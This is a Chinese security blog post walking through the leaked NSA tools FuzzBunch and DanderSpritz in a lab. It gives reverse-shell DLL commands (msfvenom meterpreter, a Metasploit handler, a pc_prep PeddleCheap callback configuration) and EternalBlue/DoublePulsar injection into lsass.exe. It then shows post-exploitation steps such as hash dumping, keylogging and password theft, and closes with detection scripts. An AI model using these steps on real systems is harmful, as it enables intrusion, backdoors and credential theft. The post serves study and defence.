
# 【技术分享】NSA泄露黑客工具之 FuzzBunch &amp; DanderSpritz 分析


                                阅读量   
                                **222578**
                            
                        |
                        
                                                                                                                                    ![](./img/85911/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](./img/85911/t0159aa136a07adc2c2.png)](./img/85911/t0159aa136a07adc2c2.png)

作者：[qingxp9 · 360无线电安全研究部@无线攻防团队](http://bobao.360.cn/member/contribute?uid=46273947)

预估稿费：500RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

** **

**传送门**

[**【技术分享】NSA泄露工具中的Dander Spiritz工具使用简易教程**](http://bobao.360.cn/learning/detail/3739.html)

[**【漏洞分析】MS 17-010：NSA Eternalblue SMB 漏洞分析**](http://bobao.360.cn/learning/detail/3738.html)



**Shadow Brokers是什么**



影子经纪（Shadow Brokers）声称攻破了为NSA开发网络武器的美国黑客团队方程式组织（Equation Group）黑客组织的计算机系统，并下载了他们大量的攻击工具（包括恶意软件、私有的攻击框架及其它攻击工具）。

方程式组织（Equation Group）是一个由卡巴斯基实验室发现的尖端网络犯罪组织，后者将其称为世界上最尖端的网络攻击组织之一，同震网（Stuxnet）和火焰（Flame）病毒的制造者紧密合作且在幕后操作。



**Shadow Brokers大招回顾**



2016年8月15日：

公布了思科ASA系列防火墙，思科PIX防火墙的漏洞。

2017年4月08日:

公布了针对Solaris远程0day漏洞。

2017年4月14日:

公布了针对Windows系统漏洞及利用工具。

下载地址：[https://github.com/x0rz/EQGRP_Lost_in_Translation](https://github.com/x0rz/EQGRP_Lost_in_Translation)

2017年4月14日大招分析

目录文件说明：

Windows：包含Windows漏洞、后门、利用工具，等配置文件信息。

[![](./img/85911/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01800ce1f4209c1634.png)

swift：包含来自银行攻击的操作说明

[![](./img/85911/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0179d22a49af311cb4.png)

oddjob：与ODDJOB后门相关的文档

[![](./img/85911/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t018e1e19020de89776.png)

漏洞对应说明

[![](./img/85911/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01344dd4547da70aea.png)



**FUZZBUNCH&amp;DanderSpritz分析**



要使用FUZZBUNCH框架需要注意以下几点

1.将工具放在英文路径下，不能含有中文，目标机防火墙关闭

2.必须Python2.6和pywin32对应版本。

3.在windows利用工具目录下创建listeningposts目录,看清楚了是window利用工具目录,不是c:window目录。

4.系统使用32位

Python2.6+pywin32下载 链接：[http://pan.baidu.com/s/1hsyvTOw](http://pan.baidu.com/s/1hsyvTOw) 密码：o1a1

FuzzBunch有点类似于metasploit，并且可跨平台，通过fb.py使用，

[![](./img/85911/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0143176e0449c7dc59.png)

FuzzBunch框架的执行，需要各种配置项

1.目标的IP地址，攻击者的;

2.指示转发选项是否将被使用;

3.指定log日志目录;

4.该项目名称。

[![](./img/85911/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0191bcd0ed8897e69e.png)

在以上的配置中，Target ip(被攻击机器)IP地址是192.168.69.42,Callback IP(回调地址)也就是运行fb.py框架的IP地址。

配置完成之后,进入下一步,使用help查看帮助命令。

[![](./img/85911/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t011e739637385397cf.png)

use命令的用途是选择插件，如下所列：

[![](./img/85911/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01d40ebbbed3c6fa40.png)

插件被分解成几类：

目标识别和利用漏洞发现：Architouch，Rpctouch，Domaintouch，Smbtouch等。;

漏洞利用：EternalBlue，Emeraldthread，Eclipsedwing，EternalRomance等。;

目标攻击后后操作：Douplepulsar,Regread,Regwrite等。

然后我们通过使用Smbtouch使用smb协议来检测对方操作系统版本、架构、可利用的漏洞。

[![](./img/85911/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t017ca39668fe029d1d.png)

[![](./img/85911/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0155b80a823c9219af.png)

在这个例子中，目标系统似乎有三个漏洞可以利用（EternalBlue，EternalRomance和EternalChampion）,经过这几天的测试,我发现EternalBlue比较稳定,我直接选择使用EternalBlue这个漏洞利用工具。

[![](./img/85911/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t012c672ba0a1f9b0c1.png)

[![](./img/85911/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01a093aa895b972893.png)

使用EternalBlue漏洞利用成功之后,会在内核中留一个后门。

[![](./img/85911/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t014395349db878ea27.png)

通过返回的信息,可以看出攻击成功,用了不到10秒钟的时间，攻击成功之后并不能直接执行命令,需要用框架的其他的插件配合。

攻击成功之后就可以开始使用DoublePulsar插件,DoublePulsar类似于一个注入器,有以下几个功能。

Ping： 检测后门是否部署成功

RUNDLL：注入dll。

RunShellcode：注入shellcode

Uninstall:用于卸载系统上的后门

在这里我使用RUNDLL来注入dll到目标系统,在注入之前,我打开metasploit生成个dll。也可以使用cobaltstrike等,注意:msf生成的dll注入到wwin7进程的时候,win7可能会重启。

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.38.129 LPORT=8089 -f dll &gt; c.dll
```

[![](./img/85911/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t019344ce98bc61e3ed.png)

打开metasploit监听反弹端口



```
$ msfconsole
    msf &gt; use exploit/multi/handler
    msf &gt; set LHOST 192.168.38.129
    msf &gt; set LPORT 8089
    msf &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp
    msf &gt; exploit
```

[![](./img/85911/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t013114d958f79c4302.png)

配置DoublePulsar来注入dll

[![](./img/85911/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t014858d1c49506a99d.png)

注入DLL到Lsass.exe进程,通过metasploit控制目标机器。

[![](./img/85911/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t010c5cc02a33f015e0.png)



**DanderSpritz介绍**



DanderSpritz是nsa著名的RAT,很多的反病毒厂商都抓到过此RAT的样本,信息收集模块做的特别全。

使用python start_lp.py启动,设置好配置信息之后,功能就可以使用。

[![](./img/85911/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t019ac83828e0447bed.png)

打开之后我们可在终端进行输入help，进行查看帮助信息。

[![](./img/85911/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01a28ab42509999c74.png)

可用命令的数量比FuzzBunch要多一些，我研究此远控的目的是为了能生成dll文件，配合DoublePulsar使用，直接反向连接到DanderSpritz,我本人不是特别喜欢用metasploit,很多的防护设备已经有了metasploit的特征,容易发现。还有metasploit生成的dll在使用DoublePulsar注入到win7的时候,win7会重启。

经过一番查找，发现pc_prep负责生成有效载荷。

[![](./img/85911/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0174dc1bf4eb4ff791.png)

pc_prep有点类似于msfvenom。使用命令pc_prep -sharedlib列出可生成dll的选项，来生成一个DLL的马儿，配置信息如下：

```
pc_prep -sharedlib
- Possible payloads:
-      0) - Quit
-      1) - Standard TCP (i386-winnt Level3 sharedlib)
-      2) - HTTP Proxy (i386-winnt Level3 sharedlib)
-      3) - Standard TCP (x64-winnt Level3 sharedlib)
-      4) - HTTP Proxy (x64-winnt Level3 sharedlib)
-      5) - Standard TCP Generic (i386-winnt Level4 sharedlib)
-      6) - HTTP Proxy Generic (i386-winnt Level4 sharedlib)
-      7) - Standard TCP AppCompat-enabled (i386-winnt Level4 sharedlib)
-      8) - HTTP Proxy AppCompat-enabled (i386-winnt Level4 sharedlib)
-      9) - Standard TCP UtilityBurst-enabled (i386-winnt Level4 sharedlib)
-     10) - HTTP Proxy UtilityBurst-enabled (i386-winnt Level4 sharedlib)
-     11) - Standard TCP WinsockHelperApi-enabled (i386-winnt Level4 sharedlib)
-     12) - HTTP Proxy WinsockHelperApi-enabled (i386-winnt Level4 sharedlib)
-     13) - Standard TCP (x64-winnt Level4 sharedlib)
-     14) - HTTP Proxy (x64-winnt Level4 sharedlib)
-     15) - Standard TCP AppCompat-enabled (x64-winnt Level4 sharedlib)
-     16) - HTTP Proxy AppCompat-enabled (x64-winnt Level4 sharedlib)
-     17) - Standard TCP WinsockHelperApi-enabled (x64-winnt Level4 sharedlib)
-     18) - HTTP Proxy WinsockHelperApi-enabled (x64-winnt Level4 sharedlib)
Pick the payload type
3
Update advanced settings
NO
Perform IMMEDIATE CALLBACK?
YES
Enter the PC ID [0]
0
Do you want to LISTEN?
NO
Enter the callback address (127.0.0.1 = no callback) [127.0.0.1]
192.168.38.128
Change CALLBACK PORTS?
NO
Change exe name in version information?
NO
- Pick a key
-   0) Exit
-   1) Create a new key
-   2) Default
Enter the desired option
2
- Configuration:
-
- &lt;?xml version='1.0' encoding='UTF-8' ?&gt;
- &lt;PCConfig&gt;
-   &lt;Flags&gt;
-     &lt;PCHEAP_CONFIG_FLAG_CALLBACK_NOW/&gt;
-     &lt;PCHEAP_CONFIG_FLAG_DONT_CREATE_WINDOW/&gt;
-   &lt;/Flags&gt;
-   &lt;Id&gt;0x0&lt;/Id&gt;
-   &lt;StartListenHour&gt;0&lt;/StartListenHour&gt;
-   &lt;StopListenHour&gt;0&lt;/StopListenHour&gt;
-   &lt;CallbackAddress&gt;192.168.38.139&lt;/CallbackAddress&gt;
- &lt;/PCConfig&gt;
-
Is this configuration valid
YES
Do you want to configure with FC?
NO
- Configured binary at:
-   E:Logsz0.0.0.1z0.0.0.1PayloadsPeddleCheap_2017_04_17_08h49m06s.296/PC_Level3_dll.configured
```

DanderSpritz(RAT)PeddleCheap选项提供三种马儿连接选择

我选择了监听方式,也就是反向连接。

然后开始监听端口，默认监听端口TCP/53，TCP/80，TCP/443，TCP/1509：

[![](./img/85911/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0150dae6f6e2a3bd58.png)

现在我们配合DoublePulsar来使用,让DoublePulsar把DanderSpritz生成的dll注入到lsass.exe进程

[![](./img/85911/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01a3c774495bbe597e.png)

然后DanderSpritz接收到的请求要求接受它。一旦yes接受连接，终端开始滚动了很多有关目标的信息，会自动执行各种命令,有一些命令需要确认,

**ARP表**

**路由表**

**系统信息**

**端口信息**

**进程列表（一些过程，如那些由虚拟化用于以不同的颜色被突出显示）;**

**内存状态**

**USB的信息**

**计划任务分析**

**安装语言和操作系统的版本**

**磁盘和可用空间的列表**

**等……………..**

[![](./img/85911/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t015e5fde90bf5fa118.png)

[![](./img/85911/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01ccf4246fe23294d8.png)

[![](./img/85911/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0127e793ed7bbf4927.png)

如果你不想从命令行查看,也可以打开插件图形化来查看以上的信息

**查看网络信息**

[![](./img/85911/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01fa2839fa9fe23b39.png)

[![](./img/85911/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01519eddc993ac500c.png)

**查看进程**

[![](./img/85911/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0111ebbb259e77adf8.png)

**打开一个shell（cmd）**

[![](./img/85911/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t018c94ecddf4f8e4d7.png)

通过信息收集之后,我们大概可以确认目标网络情况.就可以实施下一步的攻击。

**截图**

[![](./img/85911/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0171873371ac854652.png)

**hash获取**

[![](./img/85911/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01fca9c0f96d4261ee.png)

**扫描端口**

[![](./img/85911/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t010332f5722adcd911.png)

**安装键盘记录功能**

键盘记录需要使用YAK安装下,之后才可以使用。

[![](./img/85911/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0107a880f151828392.png)

**Firefox Skype等密码获取**

[![](./img/85911/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t010412689fc499871e.png)

除了这些插件之外,还有很多的插件,比如日志eventlogedit, 可以自行研究下。



**漏洞检测工具**

[https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/smb/smb_ms17_010.rb](https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/smb/smb_ms17_010.rb)

把smb_ms17_010.rb下载回来,放在自己新建的exp目，启动metasploit,在msf提示符下输入reload_all重新加载所有模块

[![](./img/85911/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0137e576e843b6104b.png)

**感染检测**

[https://github.com/countercept/doublepulsar-detection-script](https://github.com/countercept/doublepulsar-detection-script)

存在漏洞

[![](./img/85911/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01f6141a50a35139e9.png)



**传送门**

[**【技术分享】NSA泄露工具中的Dander Spiritz工具使用简易教程**](http://bobao.360.cn/learning/detail/3739.html)

[**【漏洞分析】MS 17-010：NSA Eternalblue SMB 漏洞分析**](http://bobao.360.cn/learning/detail/3738.html)


